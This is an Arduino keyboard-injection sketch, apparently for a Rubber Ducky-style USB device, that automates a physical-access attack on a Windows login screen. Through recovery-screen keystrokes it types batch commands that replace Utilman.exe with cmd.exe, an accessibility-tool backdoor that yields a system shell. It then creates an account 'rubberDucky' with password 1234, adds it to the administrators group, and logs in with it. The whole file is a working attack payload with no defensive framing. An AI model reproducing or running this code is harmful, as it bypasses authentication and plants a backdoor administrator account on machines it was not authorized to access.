#include <Keyboard.h>
String ACCOUNT_NAME = "rubberDucky";
int ACCOUNT_PASSWORD = 1234;
void typeWithDelay(String text, int delayTime) {
for (int i = 0; i < text.length(); i++) {
Keyboard.press(text[i]);
delay(delayTime);
Keyboard.release(text[i]);
}}
void setup() {
Keyboard.begin();
start:
delay(1000);


delay(2000);
typeWithDelay("QQQQQQQQQ", 5);
delay(10);
Keyboard.press(KEY_LEFT_CTRL);
delay(10);
delay(10);
Keyboard.press(KEY_LEFT_ALT);
delay(10);
delay(10);
Keyboard.press(KEY_DELETE);
delay(10);
delay(10);
Keyboard.release(KEY_DELETE);
delay(10);
delay(10);
Keyboard.release(KEY_LEFT_ALT);
delay(10);
delay(10);
Keyboard.release(KEY_LEFT_CTRL);
delay(10);
delay(10);
delay(10);
delay(3000);
Keyboard.press(KEY_LEFT_SHIFT);
delay(10);
Keyboard.press(KEY_TAB);
delay(10);
delay(10);
Keyboard.release(KEY_TAB);
delay(10);
delay(10);
delay(10);
Keyboard.release(KEY_LEFT_SHIFT);
delay(10);
Keyboard.press(KEY_KP_ENTER);
delay(10);
delay(10);
Keyboard.release(KEY_KP_ENTER);
delay(10);
delay(10);
delay(10);
delay(100);
Keyboard.press(KEY_UP_ARROW);
delay(10);
delay(10);
Keyboard.release(KEY_UP_ARROW);
delay(10);
delay(10);
delay(10);
delay(200);
Keyboard.press(KEY_LEFT_SHIFT);
delay(10);
delay(200);
Keyboard.press(' ');
delay(10);
delay(100);
Keyboard.release(' ');
delay(10);
delay(100);
Keyboard.press(KEY_KP_ENTER);
delay(10);
delay(10);
Keyboard.release(KEY_KP_ENTER);
delay(10);
delay(10);
delay(10);
Keyboard.release(KEY_LEFT_SHIFT);
delay(10);
delay(60000);
Keyboard.press(KEY_TAB);
delay(10);
delay(10);
Keyboard.release(KEY_TAB);
delay(10);
delay(10);
delay(10);
delay(50);
Keyboard.press(KEY_TAB);
delay(10);
delay(10);
Keyboard.release(KEY_TAB);
delay(10);
delay(10);
delay(10);
delay(50);
Keyboard.press(KEY_KP_ENTER);
delay(10);
delay(10);
Keyboard.release(KEY_KP_ENTER);
delay(10);
delay(10);
delay(10);
delay(1000);
Keyboard.press(KEY_TAB);
delay(10);
delay(10);
Keyboard.release(KEY_TAB);
delay(10);
delay(10);
delay(10);
delay(50);
Keyboard.press(KEY_KP_ENTER);
delay(10);
delay(10);
Keyboard.release(KEY_KP_ENTER);
delay(10);
delay(10);
delay(10);
delay(1000);
Keyboard.press(KEY_TAB);
delay(10);
delay(10);
Keyboard.release(KEY_TAB);
delay(10);
delay(10);
delay(10);
delay(50);
Keyboard.press(KEY_TAB);
delay(10);
delay(10);
Keyboard.release(KEY_TAB);
delay(10);
delay(10);
delay(10);
delay(50);
Keyboard.press(KEY_KP_ENTER);
delay(10);
delay(10);
Keyboard.release(KEY_KP_ENTER);
delay(10);
delay(10);
delay(10);
delay(1000);
typeWithDelay("@echo off", 5);
delay(10);
Keyboard.press(KEY_KP_ENTER);
delay(10);
Keyboard.release(KEY_KP_ENTER);
delay(10);
delay(10);
typeWithDelay("setlocal enabledelayedexpansion", 5);
delay(10);
Keyboard.press(KEY_KP_ENTER);
delay(10);
Keyboard.release(KEY_KP_ENTER);
delay(10);
delay(10);
typeWithDelay("for %d in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (", 5);
delay(10);
Keyboard.press(KEY_KP_ENTER);
delay(10);
Keyboard.release(KEY_KP_ENTER);
delay(10);
delay(10);
typeWithDelay("    if exist %d:\"Windows\"System32\"Utilman.exe (", 5);
delay(10);
Keyboard.press(KEY_KP_ENTER);
delay(10);
Keyboard.release(KEY_KP_ENTER);
delay(10);
delay(10);
typeWithDelay("        echo Utilman.exe found in drive %d:", 5);
delay(10);
Keyboard.press(KEY_KP_ENTER);
delay(10);
Keyboard.release(KEY_KP_ENTER);
delay(10);
delay(10);
typeWithDelay("        cd /d %d:\"Windows\"System32\"", 5);
delay(10);
Keyboard.press(KEY_KP_ENTER);
delay(10);
Keyboard.release(KEY_KP_ENTER);
delay(10);
delay(10);
typeWithDelay("    )", 5);
delay(10);
Keyboard.press(KEY_KP_ENTER);
delay(10);
Keyboard.release(KEY_KP_ENTER);
delay(10);
delay(10);
typeWithDelay(")", 5);
delay(10);
Keyboard.press(KEY_KP_ENTER);
delay(10);
Keyboard.release(KEY_KP_ENTER);
delay(10);
delay(10);
typeWithDelay("copy Utilman.exe  Utilman2.exe", 5);
delay(10);
Keyboard.press(KEY_KP_ENTER);
delay(10);
Keyboard.release(KEY_KP_ENTER);
delay(10);
delay(10);
typeWithDelay("copy  cmd.exe  Utilman.exe /y", 5);
delay(10);
Keyboard.press(KEY_KP_ENTER);
delay(10);
Keyboard.release(KEY_KP_ENTER);
delay(10);
delay(10);
typeWithDelay("exit", 5);
delay(10);
Keyboard.press(KEY_KP_ENTER);
delay(10);
Keyboard.release(KEY_KP_ENTER);
delay(10);
delay(10);
delay(1000);
Keyboard.press(KEY_KP_ENTER);
delay(10);
delay(10);
Keyboard.release(KEY_KP_ENTER);
delay(10);
delay(10);
delay(10);
delay(60000);
typeWithDelay("QQQQQQQQQ", 5);
delay(10);
delay(3000);
Keyboard.press(KEY_LEFT_SHIFT);
delay(10);
Keyboard.press(KEY_TAB);
delay(10);
delay(10);
Keyboard.release(KEY_TAB);
delay(10);
delay(10);
delay(10);
delay(50);
Keyboard.press(KEY_TAB);
delay(10);
delay(10);
Keyboard.release(KEY_TAB);
delay(10);
delay(10);
delay(10);
Keyboard.release(KEY_LEFT_SHIFT);
delay(10);
Keyboard.press(KEY_KP_ENTER);
delay(10);
delay(10);
Keyboard.release(KEY_KP_ENTER);
delay(10);
delay(10);
delay(10);
delay(1000);
typeWithDelay("net user " + String(ACCOUNT_NAME) + " " + String(ACCOUNT_PASSWORD) + " /add", 5);
delay(10);
Keyboard.press(KEY_KP_ENTER);
delay(10);
Keyboard.release(KEY_KP_ENTER);
delay(10);
delay(10);
typeWithDelay("net localgroup administrators " + String(ACCOUNT_NAME) + " /add", 5);
delay(10);
Keyboard.press(KEY_KP_ENTER);
delay(10);
Keyboard.release(KEY_KP_ENTER);
delay(10);
delay(10);
typeWithDelay("shutdown /l", 5);
delay(10);
Keyboard.press(KEY_KP_ENTER);
delay(10);
Keyboard.release(KEY_KP_ENTER);
delay(10);
delay(10);
delay(10000);
typeWithDelay("QQQQQQQQQ", 5);
delay(10);
delay(3000);
Keyboard.press(KEY_LEFT_SHIFT);
delay(10);
Keyboard.press(KEY_TAB);
delay(10);
delay(10);
Keyboard.release(KEY_TAB);
delay(10);
delay(10);
delay(10);
delay(50);
Keyboard.press(KEY_TAB);
delay(10);
delay(10);
Keyboard.release(KEY_TAB);
delay(80);
Keyboard.press(KEY_TAB);
delay(10);
Keyboard.release(KEY_TAB);
delay(80);
Keyboard.press(KEY_TAB);
delay(10);
Keyboard.release(KEY_TAB);
delay(80);
Keyboard.release(KEY_LEFT_SHIFT);
delay(10);
Keyboard.press(KEY_KP_ENTER);
delay(10);
Keyboard.release(KEY_KP_ENTER);
delay(530);
typeWithDelay("" + String(ACCOUNT_PASSWORD), 5);
delay(10);
Keyboard.press(KEY_KP_ENTER);
delay(10);
Keyboard.release(KEY_KP_ENTER);
delay(10);
end:
Keyboard.end();
}
void loop() {}
